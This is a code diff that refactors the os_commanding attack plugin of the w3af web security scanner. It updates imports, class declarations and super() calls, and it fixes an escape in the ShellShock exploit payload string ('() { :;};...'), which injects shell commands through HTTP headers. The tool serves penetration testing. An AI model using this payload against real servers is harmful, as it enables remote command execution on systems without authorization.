@@ -21,18 +21,17 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 
 import w3af.core.controllers.output_manager as om
-import w3af.plugins.attack.payloads.shell_handler as shell_handler
-
-from w3af.plugins.attack.payloads.decorators.exec_decorator import exec_debug
-from w3af.core.data.kb.exec_shell import ExecShell
-from w3af.core.data.fuzzer.utils import rand_alpha
-from w3af.core.data.fuzzer.mutants.headers_mutant import HeadersMutant
-from w3af.core.controllers.plugins.attack_plugin import AttackPlugin
-from w3af.core.controllers.misc.common_attack_methods import CommonAttackMethods
 from w3af.core.controllers.exceptions import BaseFrameworkException, BodyCutException
+from w3af.core.controllers.misc.common_attack_methods import CommonAttackMethods
+from w3af.core.controllers.plugins.attack_plugin import AttackPlugin
+from w3af.core.data.fuzzer.mutants.headers_mutant import HeadersMutant
+from w3af.core.data.fuzzer.utils import rand_alpha
+from w3af.core.data.kb.exec_shell import ExecShell
+from w3af.plugins.attack.payloads import shell_handler
+from w3af.plugins.attack.payloads.decorators.exec_decorator import exec_debug
 
 
-class ExploitStrategy(object):
+class ExploitStrategy:
     """
     Base class for the different types of exploit strategies that this plugin
     can use to execute commands and get the results.
@@ -58,7 +57,7 @@ class ExploitStrategy(object):
 
 class SeparatorExploitStrategy(ExploitStrategy):
     def __init__(self, vuln):
-        super(SeparatorExploitStrategy, self).__init__(vuln)
+        super().__init__(vuln)
 
         self._cmd_separator = self.vuln["separator"]
         self._remote_os = self.vuln["os"]
@@ -183,7 +182,7 @@ class ShellShock(ExploitStrategy):
     # receives the command to run. Note the %%s below:
     PAYLOAD_FMT = (
         '() { :;};PATH=$PATH:%s;%%s | sed "s/$/%s/" | tr -d "\\n\\r"'
-        ' | /usr/bin/awk "{print \\"%s: \\"\$0\\"\\n\\"}"'
+        ' | /usr/bin/awk "{print \\"%s: \\"\\$0\\"\\n\\"}"'
     )
     PAYLOAD_FMT = PAYLOAD_FMT % (PATH, NEW_LINE, INJECTED_HEADER)
 
@@ -318,7 +317,7 @@ class os_commanding(AttackPlugin):
 class OSCommandingShell(ExecShell):
 
     def __init__(self, strategy, uri_opener, worker_pool):
-        super(OSCommandingShell, self).__init__(strategy.vuln, uri_opener, worker_pool)
+        super().__init__(strategy.vuln, uri_opener, worker_pool)
 
         self.strategy = strategy
 
